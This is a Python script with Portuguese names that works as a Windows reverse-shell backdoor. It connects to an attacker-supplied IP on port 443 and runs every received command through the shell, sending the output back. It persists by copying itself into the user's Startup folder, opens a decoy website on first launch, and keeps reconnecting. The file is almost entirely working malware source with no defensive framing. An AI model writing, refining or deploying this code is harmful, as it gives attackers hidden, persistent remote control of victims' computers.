import socket
import time
import subprocess
import threading
import os

IP = "Seu IP"
PORT = 443


def inicializacao_habilitada():
    arquivo = os.path.basename(__file__)
    arquivo_exe = arquivo.replace(".py", ".exe")
    pasta_inicializacao = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    atalho_caminho = os.path.join(pasta_inicializacao, arquivo_exe)

    return os.path.exists(atalho_caminho)


def habilitar_inicializacao():
    arquivo = os.path.basename(__file__)
    arquivo_exe = arquivo.replace(".py", ".exe")
    pasta_inicializacao = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    atalho_caminho = os.path.join(pasta_inicializacao, arquivo_exe)

    if not os.path.exists(atalho_caminho):
        os.system(f"copy {arquivo_exe} \"{pasta_inicializacao}\"")


def conexao(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except Exception as error:
        print("Erro: ", error)


def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output)
    except Exception as error:
        print("Erro: ", error)


def escutar(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        print("Erro: ", error)
        client.close()


if __name__ == "__main__":
    if not inicializacao_habilitada():
        habilitar_inicializacao()
        os.popen('explorer https://algumsitealeatorio.com')

    while True:
        client = conexao(IP, PORT)
        if client:
            escutar(client)
        else:
            print("Erro de conex√£o, tentando novamente...")
            time.sleep(3)